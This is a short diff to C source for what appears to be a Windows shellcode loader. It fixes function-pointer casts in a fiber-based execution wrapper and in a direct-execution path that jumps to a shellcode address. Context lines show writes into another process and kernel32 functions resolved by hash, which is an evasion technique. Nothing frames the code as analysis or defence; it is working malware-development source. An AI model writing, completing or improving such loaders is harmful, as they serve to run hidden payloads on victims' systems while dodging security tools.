@@ -271,7 +271,7 @@ static void engine_write(HANDLE hProcess, void *dst, const void *src, SIZE_T siz
 struct FiberCtx { void *sc_addr; void *main_fiber; };
 static void CALLBACK engine_fiber_wrapper(LPVOID param) {
     struct FiberCtx *ctx = (struct FiberCtx*)param;
-    ((void(*)())ctx->sc_addr)();
+    ((void(*)(void*))ctx->sc_addr)(NULL);
     pSwitchToFiber pSwitch = (pSwitchToFiber)_resolve(H_MOD_KERNEL32, H_SwitchToFiber);
     if (pSwitch) pSwitch(ctx->main_fiber);
 }
@@ -320,7 +320,7 @@ static HANDLE engine_exec_local(void *addr) {
     return NULL;
 
 #else /* EXEC_DIRECT (default) */
-    ((void(*)())addr)();
+    ((void(*)(void*))addr)(NULL);
     return NULL;
 #endif
 }
